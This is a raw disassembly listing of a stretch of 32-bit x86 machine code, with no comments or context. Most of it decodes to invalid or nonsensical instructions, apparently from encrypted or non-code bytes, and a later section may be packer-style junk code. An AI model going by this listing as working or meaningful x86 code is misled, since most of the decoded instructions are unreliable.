  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4245be,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4245c6,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4245c6,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0x88e87ea
  4047be:	loop   0x40474a
  4047c0:	jle    0x404840
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [eax]
  4047d5:	sbb    ecx,DWORD PTR [eax]
  4047d7:	(bad)  
  4047d9:	bswap  eax
  4047db:	adc    BYTE PTR [edi],dh
  4047dd:	sbb    BYTE PTR [edi],bl
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
